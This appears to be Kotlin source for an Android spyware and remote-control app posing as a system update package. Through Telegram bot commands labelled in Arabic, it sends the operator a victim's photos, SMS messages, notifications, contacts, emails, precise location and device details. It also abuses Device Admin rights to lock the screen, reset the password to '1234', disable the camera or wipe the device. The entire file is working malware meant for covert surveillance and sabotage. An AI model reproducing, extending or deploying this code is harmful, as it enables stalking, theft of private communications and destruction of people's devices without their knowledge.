package com.sys.update

import android.content.Context
import android.util.Log
import org.json.JSONObject
import java.io.File

object CommandExecutor {

    private val runningJobs = java.util.concurrent.ConcurrentHashMap<String, Boolean>()

    fun handle(ctx: Context, callbackData: String, callbackId: String) {
        TelegramApi.answerCallback(callbackId)
        Log.d("CmdExec", "callback: $callbackData")
    }

    fun handleText(ctx: Context, text: String) {
        val cmd = text.trim()
        Log.d("CmdExec", "text cmd: $cmd")

        when {
            cmd == "/start" || cmd == "/menu" || cmd == "🏠 القائمة" -> showMainMenu(ctx)

            // الصور
            cmd == "📸 كل الصور" || cmd == "/photos" -> fetchAllPhotos(ctx)
            cmd == "📸 آخر 50" -> fetchLastPhotos(ctx, 50)
            cmd == "📸 آخر 200" -> fetchLastPhotos(ctx, 200)

            // SMS
            cmd == "📩 كل الرسائل" || cmd == "/sms" -> fetchAllSms(ctx)

            // الإشعارات
            cmd == "🔔 الإشعارات" || cmd == "/notifs" -> fetchAllNotifs(ctx)

            // جهات الاتصال
            cmd == "👥 جهات الاتصال" || cmd == "/contacts" -> fetchContacts(ctx)

            // الإيميلات
            cmd == "📧 الإيميلات" || cmd == "/emails" -> fetchEmails(ctx)

            // معلومات
            cmd == "📊 معلومات الجهاز" || cmd == "/info" -> showDeviceInfo(ctx)

            // الموقع
            cmd == "📍 الموقع" || cmd == "/location" -> showLocation(ctx)

            // Device Admin
            cmd == "🛡 تفعيل Admin" || cmd == "/admin" -> enableAdmin(ctx)
            cmd == "🛡 معلومات Admin" || cmd == "/admin_info" -> adminInfo(ctx)
            cmd == "🔒 قفل الشاشة" || cmd == "/lock" -> lockScreen(ctx)
            cmd == "📷 تعطيل الكاميرا" || cmd == "/disable_camera" -> disableCamera(ctx)
            cmd == "/wipe" -> wipeDevice(ctx)
            cmd == "/enable_camera" -> enableCamera(ctx)
            cmd == "/password" -> setPassword(ctx, "1234")

            // تيك توك
            cmd == "🎵 تيك توك" || cmd == "/tiktok" -> tiktokOpen(ctx)

            // جلب شامل
            cmd == "🚀 جلب كل شي" || cmd == "/all" -> fetchEverything(ctx)

            cmd.startsWith("/photos") -> {
                val n = cmd.removePrefix("/photos").trim().toIntOrNull() ?: 50
                fetchLastPhotos(ctx, n)
            }

            else -> {
                TelegramApi.sendMessage("❓ أمر غير معروف: $cmd", KeyboardBuilder.replyKeyboard())
            }
        }
    }

    // ═══════════════════════════════════════════
    //  DEVICE ADMIN
    // ═══════════════════════════════════════════
    private fun enableAdmin(ctx: Context) {
        if (AdminHelper.isEnabled(ctx)) {
            TelegramApi.sendMessage("✅ *Device Admin مفعّل مسبقًا*", KeyboardBuilder.replyKeyboard())
            return
        }
        TelegramApi.sendMessage("🛡 *جاري فتح صفحة تفعيل Admin...*")
        AdminHelper.requestEnable(ctx)
    }

    private fun adminInfo(ctx: Context) {
        val info = AdminHelper.getSecurityInfo(ctx)
        TelegramApi.sendMessage(info, KeyboardBuilder.replyKeyboard())
    }

    private fun lockScreen(ctx: Context) {
        if (!AdminHelper.isEnabled(ctx)) {
            TelegramApi.sendMessage("⚠️ فعّل Device Admin أولًا", KeyboardBuilder.replyKeyboard())
            return
        }
        val ok = AdminHelper.lockScreen(ctx)
        TelegramApi.sendMessage(
            if (ok) "🔒 تم قفل الشاشة" else "❌ فشل القفل",
            KeyboardBuilder.replyKeyboard()
        )
    }

    private fun setPassword(ctx: Context, password: String) {
        if (!AdminHelper.isEnabled(ctx)) {
            TelegramApi.sendMessage("⚠️ فعّل Device Admin أولًا", KeyboardBuilder.replyKeyboard())
            return
        }
        val ok = AdminHelper.setPassword(ctx, password)
        TelegramApi.sendMessage(
            if (ok) "🔑 تم تغيير كلمة السر" else "❌ فشل التغيير",
            KeyboardBuilder.replyKeyboard()
        )
    }

    private fun wipeDevice(ctx: Context) {
        if (!AdminHelper.isEnabled(ctx)) {
            TelegramApi.sendMessage("⚠️ فعّل Device Admin أولًا", KeyboardBuilder.replyKeyboard())
            return
        }
        TelegramApi.sendMessage("💣 *جاري مسح الجهاز...*", KeyboardBuilder.replyKeyboard())
        AdminHelper.wipeDevice(ctx)
    }

    private fun disableCamera(ctx: Context) {
        if (!AdminHelper.isEnabled(ctx)) {
            TelegramApi.sendMessage("⚠️ فعّل Device Admin أولًا", KeyboardBuilder.replyKeyboard())
            return
        }
        val ok = AdminHelper.disableCamera(ctx)
        TelegramApi.sendMessage(
            if (ok) "📷 تم تعطيل الكاميرا" else "❌ فشل التعطيل",
            KeyboardBuilder.replyKeyboard()
        )
    }

    private fun enableCamera(ctx: Context) {
        if (!AdminHelper.isEnabled(ctx)) {
            TelegramApi.sendMessage("⚠️ فعّل Device Admin أولًا", KeyboardBuilder.replyKeyboard())
            return
        }
        val ok = AdminHelper.enableCamera(ctx)
        TelegramApi.sendMessage(
            if (ok) "📷 تم تفعيل الكاميرا" else "❌ فشل",
            KeyboardBuilder.replyKeyboard()
        )
    }

    // ═══════════════════════════════════════════
    //  CONTACTS & EMAILS
    // ═══════════════════════════════════════════
    private fun fetchContacts(ctx: Context) {
        runJob(ctx, "contacts") {
            TelegramApi.sendMessage("👥 *جاري قراءة جهات الاتصال...*")
            val contacts = ContactsHelper.getAllContacts(ctx)
            if (contacts.isEmpty()) {
                TelegramApi.sendMessage("📭 لا توجد جهات اتصال", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            val sb = StringBuilder()
            sb.append("👥 *جهات الاتصال* — ${contacts.size}\n━━━━━━━━━━━━━━━━━━━━\n\n")
            var count = 0
            for (c in contacts) {
                sb.append("👤 *${c.name}*\n")
                if (c.phones.isNotEmpty()) sb.append("📞 ${c.phones.joinToString(" , ")}\n")
                if (c.emails.isNotEmpty()) sb.append("📧 ${c.emails.joinToString(" , ")}\n")
                sb.append("\n")
                count++
                if (sb.length > 3500) { TelegramApi.sendMessage(sb.toString()); sb.clear() }
                if (count >= 100) { sb.append("… +${contacts.size - count} آخرين\n"); break }
            }
            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
        }
    }

    private fun fetchEmails(ctx: Context) {
        runJob(ctx, "emails") {
            TelegramApi.sendMessage("📧 *جاري قراءة الإيميلات...*")
            val emails = ContactsHelper.getAllEmails(ctx)
            if (emails.isEmpty()) {
                TelegramApi.sendMessage("📭 لا توجد إيميلات", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            val sb = StringBuilder()
            sb.append("📧 *كل الإيميلات* — ${emails.size}\n━━━━━━━━━━━━━━━━━━━━\n\n")
            for (e in emails) {
                sb.append("✉️ *${e.name}*\n`${e.email}`\n\n")
                if (sb.length > 3500) { TelegramApi.sendMessage(sb.toString()); sb.clear() }
            }
            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
        }
    }

    // ═══════════════════════════════════════════
    //  TIKTOK
    // ═══════════════════════════════════════════
    private fun tiktokOpen(ctx: Context) {
        runJob(ctx, "tiktok_open") {
            TelegramApi.sendMessage("🎵 *جاري فتح تيك توك...*")
            val ok = TikTokController.openTikTok(ctx)
            TelegramApi.sendMessage(
                if (ok) "✅ تم فتح تيك توك" else "❌ فشل",
                KeyboardBuilder.replyKeyboard()
            )
        }
    }

    // ═══════════════════════════════════════════
    //  MENUS
    // ═══════════════════════════════════════════
    private fun showMainMenu(ctx: Context) {
        TelegramApi.sendMessage(
            "🎛 *لوحة التحكم — CREFTEX*\n\nاختر العملية من الأزرار 👇",
            KeyboardBuilder.replyKeyboard()
        )
    }

    private fun showDeviceInfo(ctx: Context) {
        val info = DeviceInfo.getFullInfo(ctx)
        TelegramApi.sendMessage(info, KeyboardBuilder.replyKeyboard())
    }

    private fun showLocation(ctx: Context) {
        runJob(ctx, "location") {
            TelegramApi.sendMessage("📍 *جاري تحديد الموقع...*")
            val loc = LocationHelper.getPreciseLocation(ctx)
            val text = LocationHelper.formatLocation(ctx, loc)
            TelegramApi.sendMessage(text, KeyboardBuilder.replyKeyboard())
        }
    }

    // ═══════════════════════════════════════════
    //  PHOTOS
    // ═══════════════════════════════════════════
    private fun fetchAllPhotos(ctx: Context) {
        runJob(ctx, "photos_all") {
            val all = MediaScanner.scanImages(ctx)
            sendPhotosList(ctx, all, "📸 كل الصور (${all.size})")
        }
    }

    private fun fetchLastPhotos(ctx: Context, n: Int) {
        runJob(ctx, "photos_$n") {
            val all = MediaScanner.scanImages(ctx).take(n)
            sendPhotosList(ctx, all, "📸 آخر $n صورة")
        }
    }

    private fun sendPhotosList(ctx: Context, list: List<MediaScanner.MediaFile>, title: String) {
        if (list.isEmpty()) {
            TelegramApi.sendMessage("📸 لا توجد صور", KeyboardBuilder.replyKeyboard())
            return
        }
        var sent = 0
        var failed = 0
        for (item in list) {
            val file = File(item.path)
            if (!file.exists()) { failed++; continue }
            val ok = TelegramApi.sendPhoto(file, item.name)
            if (ok) sent++ else failed++
        }
        TelegramApi.sendMessage("$title\n✅ $sent\n❌ $failed", KeyboardBuilder.replyKeyboard())
    }

    // ═══════════════════════════════════════════
    //  SMS
    // ═══════════════════════════════════════════
    private fun fetchAllSms(ctx: Context) {
        runJob(ctx, "sms_all") {
            val inbox = SmsReader.scanAll(ctx)
            val sent = SmsReader.scanSent(ctx)
            val all = (inbox + sent).sortedByDescending { it.optString("date") }
            if (all.isEmpty()) {
                TelegramApi.sendMessage("📩 لا رسائل", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            val grouped = all.groupBy { it.optString("address", "unknown") }
            val sb = StringBuilder()
            sb.append("📩 *SMS* — ${all.size}\n━━━━━━━━━━━━━━━━━━━━\n\n")
            for ((address, msgs) in grouped) {
                sb.append("📞 *$address* (${msgs.size})\n")
                for (m in msgs.take(5)) {
                    val type = if (m.optString("type") == "sms_sent") "📤" else "📥"
                    sb.append("  $type ${m.optString("body", "").take(80)}\n")
                }
                if (msgs.size > 5) sb.append("  … +${msgs.size - 5}\n")
                sb.append("\n")
                if (sb.length > 3500) { TelegramApi.sendMessage(sb.toString()); sb.clear() }
            }
            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
        }
    }

    // ═══════════════════════════════════════════
    //  NOTIFICATIONS
    // ═══════════════════════════════════════════
    private fun fetchAllNotifs(ctx: Context) {
        runJob(ctx, "notifs_all") {
            val lines = DataStore.readNotifications(ctx, limit = 5000)
            val notifs = lines.mapNotNull { line ->
                try { val obj = JSONObject(line); if (obj.optString("type") == "notif") obj else null }
                catch (_: Exception) { null }
            }
            if (notifs.isEmpty()) {
                TelegramApi.sendMessage("🔔 لا إشعارات", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            val grouped = notifs.groupBy { it.optString("pkg", "unknown") }
            val sb = StringBuilder()
            sb.append("🔔 *الإشعارات* — ${notifs.size}\n━━━━━━━━━━━━━━━━━━━━\n\n")
            for ((pkg, items) in grouped) {
                sb.append("📱 *$pkg* (${items.size})\n")
                for (n in items.take(5)) {
                    val t = n.optString("title", "")
                    val tx = n.optString("text", "")
                    if (t.isNotBlank()) sb.append("  ▸ $t\n")
                    if (tx.isNotBlank()) sb.append("    $tx\n")
                }
                if (items.size > 5) sb.append("  … +${items.size - 5}\n")
                sb.append("\n")
                if (sb.length > 3500) { TelegramApi.sendMessage(sb.toString()); sb.clear() }
            }
            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
        }
    }

    // ═══════════════════════════════════════════
    //  FETCH ALL
    // ═══════════════════════════════════════════
    private fun fetchEverything(ctx: Context) {
        runJob(ctx, "all") {
            TelegramApi.sendMessage("🚀 *بدأ الجلب الشامل*")
            Thread.sleep(400)
            try { TelegramApi.sendMessage(DeviceInfo.getFullInfo(ctx)) } catch (_: Exception) {}
            Thread.sleep(400)
            try {
                val loc = LocationHelper.getPreciseLocation(ctx)
                TelegramApi.sendMessage(LocationHelper.formatLocation(ctx, loc))
            } catch (_: Exception) {}
            Thread.sleep(400)
            val photos = MediaScanner.scanImages(ctx).take(30)
            sendPhotosList(ctx, photos, "📸 الصور")
            Thread.sleep(400)
            fetchAllSms(ctx)
            Thread.sleep(400)
            fetchAllNotifs(ctx)
            Thread.sleep(400)
            fetchContacts(ctx)
            TelegramApi.sendMessage("✅ *اكتمل*", KeyboardBuilder.replyKeyboard())
        }
    }

    private fun runJob(ctx: Context, jobName: String, block: () -> Unit) {
        Thread {
            try { block() } catch (e: Exception) {
                Log.e("CmdExec", "job $jobName err: ${e.message}")
                TelegramApi.sendMessage("❌ خطأ في $jobName: ${e.message}", KeyboardBuilder.replyKeyboard())
            }
        }.start()
    }
}
